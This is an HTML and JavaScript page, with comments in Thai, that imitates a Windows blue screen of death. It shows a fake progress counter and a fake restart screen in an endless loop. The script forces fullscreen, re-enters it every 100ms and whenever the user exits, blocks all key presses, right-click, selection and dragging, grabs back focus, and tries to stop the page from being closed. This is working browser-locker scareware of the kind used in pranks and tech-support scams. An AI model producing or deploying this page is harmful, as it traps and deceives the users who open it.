<!DOCTYPE html>
<html>
<head>
  <style>
    html, body {
      margin: 0;
      padding: 0;
      width: 100vw;
      height: 100vh;
      background-color: #0078d7;
      color: white;
      font-family: "Segoe UI", sans-serif;
      overflow: hidden;
      cursor: none !important;
      user-select: none;
      -webkit-user-select: none;
      -moz-user-select: none;
      -ms-user-select: none;
    }
    .bsod {
      width: 100vw;
      height: 100vh;
      padding: 40px;
      box-sizing: border-box;
    }
    .container {
      max-width: 800px;
      margin: 0 auto;
    }
    .emoji {
      font-size: 80px;
      margin-bottom: 20px;
    }
    .header {
      font-size: 24px;
      margin-bottom: 20px;
    }
    .message {
      font-size: 18px;
      line-height: 1.5;
      margin-bottom: 40px;
    }
    .details {
      font-size: 16px;
      line-height: 1.6;
    }
    .qr {
      margin-top: 40px;
      width: 100px;
      height: 100px;
      background-color: white;
    }
    .progress {
      margin-top: 40px;
      font-size: 16px;
    }
    .restart-screen {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      width: 100vw;
      height: 100vh;
      background-color: black;
      color: white;
      justify-content: center;
      align-items: center;
    }
    .loading {
      display: flex;
      justify-content: center;
      margin-top: 20px;
    }
    .loading-dot {
      width: 10px;
      height: 10px;
      margin: 0 5px;
      background-color: white;
      border-radius: 50%;
      animation: pulse 1s infinite;
    }
    @keyframes pulse {
      0% { transform: scale(0.8); opacity: 0.5; }
      50% { transform: scale(1.2); opacity: 1; }
      100% { transform: scale(0.8); opacity: 0.5; }
    }
  </style>
</head>
<body>
  <div class="bsod">
    <div class="container">
      <div class="emoji">:(</div>
      <div class="header">
        Your PC ran into a problem and needs to restart.
      </div>
      <div class="message">
        We're just collecting some error info, and then we'll restart for you. (0% complete)
      </div>
      <div class="details">
        Stop Code: CRITICAL_PROCESS_DIED<br>
        What failed: system32.exe
      </div>
      <div class="qr"></div>
      <div class="progress">
        For more information about this issue and possible fixes, visit https://windows.com/stopcode
      </div>
    </div>
  </div>

  <div class="restart-screen">
    <div class="restart-content">
      <div style="text-align: center;">
        <img src="/api/placeholder/50/50" alt="Windows logo" />
        <div class="loading">
          <div class="loading-dot" style="animation-delay: 0s"></div>
          <div class="loading-dot" style="animation-delay: 0.2s"></div>
          <div class="loading-dot" style="animation-delay: 0.4s"></div>
        </div>
      </div>
    </div>
  </div>

  <script>
    // ฟังก์ชันเข้าสู่โหมดเต็มจอ
    function enterFullscreen(element) {
      try {
        if(element.requestFullscreen) {
          element.requestFullscreen();
        } else if(element.mozRequestFullScreen) {
          element.mozRequestFullScreen();
        } else if(element.webkitRequestFullscreen) {
          element.webkitRequestFullscreen();
        } else if(element.msRequestFullscreen) {
          element.msRequestFullscreen();
        }
      } catch(e) {
        console.error("Fullscreen failed");
      }
    }

    // ตรวจสอบและบังคับให้อยู่ในโหมดเต็มจอ
    function checkFullscreen() {
      if (!document.fullscreenElement && 
          !document.mozFullScreenElement && 
          !document.webkitFullscreenElement && 
          !document.msFullscreenElement) {
        enterFullscreen(document.documentElement);
      }
    }

    const messageEl = document.querySelector('.message');
    const restartScreen = document.querySelector('.restart-screen');
    
    // เริ่มทำงานทันทีที่โหลดหน้า
    window.onload = function() {
      // พยายามเข้าสู่โหมดเต็มจอทันที
      enterFullscreen(document.documentElement);
      
      // ตรวจสอบโหมดเต็มจอทุกๆ 100ms
      setInterval(checkFullscreen, 100);
      
      startBSOD();
    }

    // เพิ่ม event listener สำหรับการคลิก
    document.addEventListener('click', function() {
      enterFullscreen(document.documentElement);
    });

    function startBSOD() {
      let progress = 0;
      
      const interval = setInterval(() => {
        if (progress < 100) {
          progress += Math.floor(Math.random() * 15);
          if (progress > 100) progress = 100;
          messageEl.textContent = `We're just collecting some error info, and then we'll restart for you. (${progress}% complete)`;

          if (progress === 100) {
            clearInterval(interval);
            setTimeout(showRestartScreen, 1000);
          }
        }
      }, 1000);
    }

    function showRestartScreen() {
      document.querySelector('.bsod').style.display = 'none';
      restartScreen.style.display = 'flex';
      
      setTimeout(() => {
        restartScreen.style.display = 'none';
        document.querySelector('.bsod').style.display = 'block';
        startBSOD();
      }, 5000);
    }

    // ป้องกันการออกจากโหมดเต็มจอ
    document.addEventListener('fullscreenchange', function() {
      if (!document.fullscreenElement) {
        enterFullscreen(document.documentElement);
      }
    });
    document.addEventListener('mozfullscreenchange', function() {
      if (!document.mozFullScreenElement) {
        enterFullscreen(document.documentElement);
      }
    });
    document.addEventListener('webkitfullscreenchange', function() {
      if (!document.webkitFullscreenElement) {
        enterFullscreen(document.documentElement);
      }
    });
    document.addEventListener('msfullscreenchange', function() {
      if (!document.msFullscreenElement) {
        enterFullscreen(document.documentElement);
      }
    });

    // ป้องกันการใช้งานปุ่มต่างๆ
    document.addEventListener('keydown', function(e) {
      e.preventDefault();
    }, true);

    // ป้องกันการคลิกขวา
    document.addEventListener('contextmenu', function(e) {
      e.preventDefault();
    });

    // ป้องกันการเลือกข้อความ
    document.addEventListener('selectstart', function(e) {
      e.preventDefault();
    });

    // ป้องกันการลากและวาง
    document.addEventListener('dragstart', function(e) {
      e.preventDefault();
    });

    // พยายามจับการ focus ออกจากหน้าต่าง
    window.addEventListener('blur', function() {
      window.focus();
    });

    // พยายามป้องกันการออกจากหน้า
    window.onbeforeunload = function() {
      return false;
    };
  </script>
</body>
</html>
